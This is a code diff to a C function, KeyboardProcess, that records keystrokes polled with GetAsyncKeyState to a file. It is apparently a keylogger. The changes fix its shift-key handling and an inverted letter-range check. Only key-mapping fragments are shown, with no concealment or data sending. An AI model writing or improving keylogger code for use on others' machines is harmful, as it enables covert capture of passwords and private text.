@@ -16,16 +16,16 @@ void KeyboardProcess(const char* filepath)
                 GetAsyncKeyState(VK_RSHIFT))
                 switch (keyCode) 
                 {
-		    		case '1':  fputc('!', file);  goto end;
-		    		case '2':  fputc('@', file);  goto end;
-		    		case '3':  fputc('#', file);  goto end;
-		    		case '4':  fputc('$', file);  goto end;
-		    		case '5':  fputc('%', file);  goto end;
-		    		case '6':  fputc('^', file);  goto end;
-		    		case '7':  fputc('&', file);  goto end;
-		    		case '8':  fputc('*', file);  goto end;
-		    		case '9':  fputc('(', file);  goto end;
-		    		case '0':  fputc(')', file);  goto end;
+		    		case '1':  fputc('!', file);  break;
+		    		case '2':  fputc('@', file);  break;
+		    		case '3':  fputc('#', file);  break;
+		    		case '4':  fputc('$', file);  break;
+		    		case '5':  fputc('%', file);  break;
+		    		case '6':  fputc('^', file);  break;
+		    		case '7':  fputc('&', file);  break;
+		    		case '8':  fputc('*', file);  break;
+		    		case '9':  fputc('(', file);  break;
+		    		case '0':  fputc(')', file);  break;
     
 		    		case 0xBA: fputc(':', file);  break;
 		    		case 0xBB: fputc('+', file);  break;
@@ -41,7 +41,7 @@ void KeyboardProcess(const char* filepath)
     
                     default:
                     {
-                        if (keyCode <= 0x41 && keyCode >= 0x5A)
+                        if (keyCode >= 0x41 && keyCode <= 0x5A)
                             fputc(toupper(keyCode), file);
                         else
                             fputs("<SHIFT>", file);
@@ -100,10 +100,7 @@ void KeyboardProcess(const char* filepath)
                 
                 default: fputc(tolower(keyCode), file);
                 }
-
-            end: continue;
         }
-
     }
 
     fclose(file);
